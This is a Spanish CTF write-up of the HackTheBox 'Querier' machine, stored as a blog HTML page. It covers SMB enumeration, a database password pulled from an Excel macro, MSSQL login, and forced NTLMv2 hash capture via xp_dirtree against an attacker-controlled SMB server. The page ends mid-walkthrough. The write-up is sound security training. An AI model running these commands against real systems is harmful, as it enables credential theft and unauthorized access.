@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Querier Writeup" /><meta name="author" content="root3200" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Querier" /><meta property="og:description" content="Querier" /><link rel="canonical" href="https://root3200.github.io/posts/querier/" /><meta property="og:url" content="https://root3200.github.io/posts/querier/" /><meta property="og:site_name" content="Root3200" /><meta property="og:image" content="https://root3200.github.io/assets/img/Querier.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:image:alt" content="Querier" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-19T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://root3200.github.io/assets/img/Querier.png" /><meta name="twitter:image:alt" content="Querier" /><meta property="twitter:title" content="Querier Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@root3200" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"root3200"},"dateModified":"2022-11-19T00:00:00+01:00","datePublished":"2022-11-19T00:00:00+01:00","description":"Querier","headline":"Querier Writeup","image":{"width":800,"height":500,"alt":"Querier","url":"https://root3200.github.io/assets/img/Querier.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://root3200.github.io/posts/querier/"},"url":"https://root3200.github.io/posts/querier/"}</script><title>Querier Writeup | Root3200</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Root3200"><meta name="application-name" content="Root3200"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/test.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Root3200</a></div><div class="site-subtitle font-italic">CTF player / Red team</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/root3200" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['jazper3200','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Querier Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Querier Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1668812400" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 19/11/2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="../../assets/img/Querier.png" class="preview-img bg" alt="Querier" width="800" height="500" data-proofer-ignore><figcaption class="text-center pt-2 pb-2">Querier</figcaption></div><div class="d-flex justify-content-between"> <span> Por <em> <a href=""></a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2084 palabras"> <em>11 min</em> de lectura</span></div></div></div><div class="post-content"><h1 id="querier">Querier</h1><p>Maquina windows con SMB expuesto , un archivo XLSM con informacion de una base de datos, dos vias para escalar privilegios.</p><h2 id="reconocimiento"><span class="mr-2">Reconocimiento.</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">&gt;</span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.125
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">&gt;</span>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 <span class="nt">-Pn</span> 10.10.10.125 
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.93 scan initiated Thu Nov 17 21:02:09 2022 as: nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -Pn -oN scanport 10&gt;</span>
+Nmap scan report <span class="k">for </span>10.10.10.125
+Host is up <span class="o">(</span>0.043s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2022-11-17T16:05:16
+|_Not valid after:  2052-11-17T16:05:16
+|_ssl-date: 2022-11-17T20:03:12+00:00<span class="p">;</span> 0s from scanner time.
+|_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2022-11-17T20:03:05
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Nov 17 21:03:12 2022 -- 1 IP address (1 host up) scanned in 63.07 seconds</span>
+</pre></table></code></div></div><h2 id="enumeracion"><span class="mr-2">Enumeracion.</span><a href="#enumeracion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Puerto 445. Usaremos <code class="language-plaintext highlighter-rouge">smbmap</code> para ver si tenemos recursos compratidos.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="o">&gt;</span>smbmap <span class="nt">-H</span> 10.10.10.25 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-p</span> <span class="s1">''</span>
+
+<span class="o">[</span>+] Guest session   	IP: 10.10.10.125:445	Name: htb.local                                         
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	Reports                                           	READ ONLY
+	
+</pre></table></code></div></div><p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">Reports</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> 10.10.10.125 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Reports'</span>
+<span class="o">[</span>+] Guest session   	IP: 10.10.10.125:445	Name: htb.local                                         
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	Reports                                           	READ ONLY	
+	.<span class="se">\R</span>eports<span class="se">\*</span>
+	dr--r--r--                0 Tue Jan 29 00:26:31 2019	<span class="nb">.</span>
+	dr--r--r--                0 Tue Jan 29 00:26:31 2019	..
+	fr--r--r--            12229 Tue Jan 29 00:26:31 2019	Currency Volume Report.xlsm
+
+</pre></table></code></div></div><p>Dentro hay un archivo <code class="language-plaintext highlighter-rouge">XLSM</code>, vamos a descargarlo.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="o">&gt;</span>smbmap <span class="nt">-H</span> 10.10.10.125 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--download</span> <span class="s1">'Reports/Currency Volume Report.xlsm'</span>
+<span class="o">[</span>+] Starting download: Reports<span class="se">\C</span>urrency Volume Report.xlsm <span class="o">(</span>12229 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/r4m3200/Escritorio/HTB/Querier/nmap/10.10.10.125-Reports_Currency Volume Report.xlsm
+
+</pre></table></code></div></div><p>Examinemos el archivo.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ file report.xlsm
+report.xlsm: Microsoft Excel 2007+
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre>❯ exiftool report.xlsm
+ExifTool Version Number         : 12.49
+File Name                       : report.xlsm
+Directory                       : <span class="nb">.</span>
+File Size                       : 12 kB
+File Modification Date/Time     : 2022:11:17 22:39:18+01:00
+File Access Date/Time           : 2022:11:19 19:51:31+01:00
+File Inode Change Date/Time     : 2022:11:17 22:39:39+01:00
+File Permissions                : <span class="nt">-rw-r--r--</span>
+File Type                       : XLSM
+File Type Extension             : xlsm
+MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled.12
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x513599ac
+Zip Compressed Size             : 367
+Zip Uncompressed Size           : 1087
+Zip File Name                   : <span class="o">[</span>Content_Types].xml
+Creator                         : Luis
+Last Modified By                : Luis
+Create Date                     : 2019:01:21 20:38:56Z
+Modify Date                     : 2019:01:27 22:21:34Z
+Application                     : Microsoft Excel
+Doc Security                    : None
+Scale Crop                      : No
+Heading Pairs                   : Worksheets, 1
+Titles Of Parts                 : Currency Volume
+Company                         : 
+Links Up To Date                : No
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 16.0300
+
+</pre></table></code></div></div><p>Con <code class="language-plaintext highlighter-rouge">exiftool</code> vemos el creador, la fecha y que tiene una macro habilitada.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre><td class="rouge-code"><pre>❯ olevba <span class="nt">-c</span> report.xlsm
+olevba 0.60.1 on Python 3.10.8 - http://decalage.info/python/oletools
+<span class="o">===============================================================================</span>
+FILE: report.xlsm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected <span class="k">for </span>files <span class="k">in </span>memory
+<span class="nt">-------------------------------------------------------------------------------</span>
+VBA MACRO ThisWorkbook.cls 
+<span class="k">in </span>file: xl/vbaProject.bin - OLE stream: <span class="s1">'VBA/ThisWorkbook'</span>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+<span class="s1">' macro to pull data for client volume reports
+'</span>
+<span class="s1">' further testing required
+
+Private Sub Connect()
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn = New ADODB.Connection
+conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+
+  '</span> MsgBox <span class="s2">"connection successful"</span>
+ 
+  <span class="s1">'Set rs = conn.Execute("SELECT * @@version;")
+  Set rs = conn.Execute("SELECT * FROM volume;")
+  Sheets(1).Range("A1").CopyFromRecordset rs
+  rs.Close
+
+End If
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls 
+in file: xl/vbaProject.bin - OLE stream: '</span>VBA/Sheet1<span class="s1">'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+
+</span></pre></table></code></div></div><p>La tool <code class="language-plaintext highlighter-rouge">olevba</code> nos permite analizar mas a fondo el archivo, vemos que la macro es para conectarse a un base de datos.</p><p><code class="language-plaintext highlighter-rouge">Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"</code></p><p>Tenemos un usuario <code class="language-plaintext highlighter-rouge">reporting</code> y una contraseña <code class="language-plaintext highlighter-rouge">PcwTWTHRwryjc$c6</code> comprobamos con <code class="language-plaintext highlighter-rouge">Crackmapexec</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ cme smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'reporting'</span> <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">-d</span> WORKGROUP
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> 
+</pre></table></code></div></div><p>Las credenciales son validas, la usaremos para intentar conectarnos a la base de datos con <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>❯ impacket-mssqlclient WORKGROUP/reporting@10.10.10.125 <span class="nt">-windows-auth</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</pre></table></code></div></div><p>Comprobamos si tenemos el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> habilitado.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>SQL&gt; <span class="nb">help
+
+     </span>lcd <span class="o">{</span>path<span class="o">}</span>                 - changes the current <span class="nb">local </span>directory to <span class="o">{</span>path<span class="o">}</span>
+     <span class="nb">exit</span>                       - terminates the server process <span class="o">(</span>and this session<span class="o">)</span>
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell <span class="o">{</span>cmd<span class="o">}</span>          - executes cmd using xp_cmdshell
+     sp_start_job <span class="o">{</span>cmd<span class="o">}</span>         - executes cmd using the sql server agent <span class="o">(</span>blind<span class="o">)</span>
+     <span class="o">!</span> <span class="o">{</span>cmd<span class="o">}</span>                    - executes a <span class="nb">local </span>shell cmd
+     
+SQL&gt; enable_xp_cmdshell
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
+SQL&gt; 
+</pre></table></code></div></div><p>No te nemos permiso para ejecutar comandos, pero si se puede usar el <code class="language-plaintext highlighter-rouge">xp_dirtree</code>, si creamos un recurso compartido con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> se puede obtener un hash <code class="language-plaintext highlighter-rouge">NTLM-v2</code> que se puede crackear con <code class="language-plaintext highlighter-rouge">john</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>SQL&gt; xp_dirtree <span class="s1">'\\10.10.14.9\smbFolder'</span>
+subdirectory                            
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.125,49678<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
